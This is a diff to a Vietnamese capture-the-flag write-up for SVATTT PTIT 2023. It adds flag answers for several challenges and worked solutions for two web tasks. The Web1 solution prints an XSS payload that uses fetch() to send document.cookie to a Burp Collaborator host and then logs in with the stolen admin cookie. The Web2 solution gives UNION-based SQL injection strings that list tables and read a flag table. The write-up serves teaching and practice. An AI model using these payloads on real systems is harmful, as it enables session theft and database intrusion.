@@ -4,14 +4,14 @@
 
 | Title | Category | Flag |
 |---|---|---|
-| Pwn01 | Pwn |  |
-| Pwn02 | Pwn |  |
-| Re1 | RE |  |
-| Re2 | RE |  |
-| Re3 | RE |  |
+| Pwn01 | Pwn | `ATTT{s3cur1tyy_@-@_t3h_ckUf}` |
+| Pwn02 | Pwn | `ATTT{Im4b4dboizwh0puShs33d1nU}` |
+| Re1 | RE | `ATTT{345y_m341}` |
+| Re2 | RE | `ATTT{BAINAYRATLADETOANG}` |
+| Re3 | RE | `ATTT{XachBaloLenVaDi}` |
 | Web1 | Web | `ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}` |
 | Web2 | Web | `ATTT{4_51mpl3_r3v_5ql}` |
-| Web1-Again | Web |  |
+| Web1-Again | Web | `ATTT{4c3076335f56407476303639}` |
 | Crypto1 | Cryptography | `ATTT{Meow_meow_meow_meow_tra_lai_tam_tri_toi_day}` |
 | Crypto2 | Cryptography | `ATTT{NOT_A_SUBSTITUTION_CIPHER}` |
 | For1 | Forensics | `ATTT{https://www.youtube.com/watch?v=4qNALNWoGmI}` |
@@ -37,7 +37,7 @@
 
 #### Challenge
 
-[enc.cpp](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/enc.cpp)
+[enc.cpp](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/enc.cpp) -S
 [bases.txt](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/bases.txt)
 
 #### Solution
@@ -56,7 +56,7 @@
 
 <p> Do you know the substitution cipher? In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with the ciphertext. CTF players often use quipqiup tool to decrypt substitution cipher. If you want to create a tool like quipqiup, you should use frequency analysis method as an aid to breaking substitution ciphers. But today is not the day for subtitution cipher. Today I'm using AES encryption to protect my secret. Can you break it? <p>
 
-[cipher.txt](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/cipher.txt) 
+[cipher.txt](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/cipher.txt) -
 [enc.py](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/enc.py)
 
 * Đề bài cho 1 file cipher và source enc.
@@ -139,3 +139,81 @@ if __name__ == "__main__":
   * Đến đây còn duy nhất 2 ký tự cuối trong cụm **"?I???"**. Đến đây thì thử các từ sao cho có nghĩa là được. 1 người biết tiếng Anh chắc chắn không mất nhiều lần để đoán ra đó là từ **"Cipher"** đâu nhỉ.
 
 **Flag**: `ATTT{NOT_A_SUBSTITUTION_CIPHER}`
+
+
+# Web: Web1
+
+#### Challenge
+
+[Link challenge](http://167.172.80.186:1337/) -
+[Link bot](http://167.172.80.186:7777/)
+
+#### Solution
+
+* Ở challenge này chúng ta có 2 trang web, 1 là web bot, 1 trang web có chức năng viết note và hiển thị note. Và nhìn vào trang web note tôi đã nghĩ đến việc thử XSS đầu tiên.
+* Ban đầu thử 1 script đơn giản `<script>alert(1)</script>` nhưng không thực hiện được, tôi nghĩ tag `<script>` đã bị filter nên tôi quay sang thử tag khác `<img src=1 onerror=alert(1)>` và thành công.
+* Tiếp đến tôi quay ra thử con bot. Sau khi ném cho bot 1 cái link hoặc ko và chỉ cần bấm send thì nó sẽ hiển thị **Thank for submit!!!**
+* Rồi tôi thử cho con bot send đền link Burp Collaborator client thì thấy con bot gửi đến 1 HTTP request GET đến /login
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic1.jpg?raw=true)
+ 
+* Thử đến đây tôi đã nghĩ 1 kịch bản tấn công có thể sẽ là lấy cookie của client vói XSS và sau đó login với cookie đó:
+  * Đầu tiên tôi sử dụng **fetch API** và nhét nó vào payload XSS để nó chạy trên web note như sau:
+    > `<img src=x
+    onerror="fetch('http://dvcy9080etobil16d12dzsm960cw0l.burpcollaborator.net/',
+{method: 'POST', mode: 'no-cors' ,body:document.cookie})">`
+
+  * Sau khi sub lên web note URL cũng sẽ chứa đoạn payload đó.
+    > `http://167.172.80.186:1337/home.php?content=<img+src=x+
+onerror+="fetch('http://zhkkvmum0fax47nsznozle8vsmyfm4.burpcollaborator.net/',+{method:+'POST',+mode:+'no-cors'+,body:document.cookie})">`
+
+  * Lấy url đó sang web bot và gửi nó đi.
+  * Từ đó kịch bản tấn công sẽ được thực hiện: Con bot sẽ truy cập trang web note, lấy cookie sau đó gắn vào body của post request gửi đến Burpcollab. Sau đó theo dõi **interactions** của Burpcollab client sẽ thấy request kèm cookie 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic2.jpg?raw=true)
+  * Cuối cùng lấy cookie đó login tôi đã vào được acc **admin**
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic3.jpg?raw=true)
+  
+**Flag**: ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}
+
+# Web: Web2
+
+#### Challenge
+
+[link](http://167.172.80.186:5000/)
+
+#### Solution
+
+* Khi truy cập trang web những thông tin gây chú ý đầu tiên sẽ là **LQS Search**, **Reverse of name** và thử search “a” ra được kết quả như hình:
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic1.jpg?raw=true)
+ 
+* Rồi kiểm tra chức năng “Reverse of name” xem nó hoạt động như thế nào, search “Joseph” không có gì, reverse nó lại “hpesoJ” sẽ ra kết quả
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic2.jpg?raw=true)
+ 
+* Tiếp theo thử SQLi Reverse: **`# -- '1'='1' RO ' a`** 
+* Hiển thị tất cả dữ liệu trong bảng => **_SQLi_**
+* Kiểm tra số cột: **`# -- 1,1,1,1 tceles noinu ' a => input error`** => ít hơn 4 cột
+* **`-- 1,1,1 tceles noinu ' a`** => 3 cột
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic3.jpg?raw=true)
+ 
+* **Check table:**
+  > Joseph ' union select null,TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES -- # => # -- SELBAT.AMEHCS_NOITAMROFNI MORF LLUN ,EMAN_ELBAT,llun tceles noinu ' hpesoJ
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic4.jpg?raw=true)
+ 
+* Lướt 1 xíu tìm thấy table **flag**
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic5.jpg?raw=true)
+ 
+* Tiếp tục check column:
+  > Joseph 'UNION SELECT null, column_name,null FROM information_schema.columns WHERE table_name='flag' -- # => # -- 'galf'=eman_elbat EREHW snmuloc.amehcs_noitamrofni MORF llun,eman_nmuloc ,llun TCELES NOINU' hpesoJ 
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic6.jpg?raw=true)
+  
+* Lấy **flag**:
+  > Joseph 'UNION SELECT null, flag,null FROM flag -- # => # -- galf MORF llun,galf ,llun TCELES NOINU' hpesoJ
+  
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic7.jpg?raw=true)
+  
+**Flag**: ATTT{4_51mpl3_r3v_5ql}
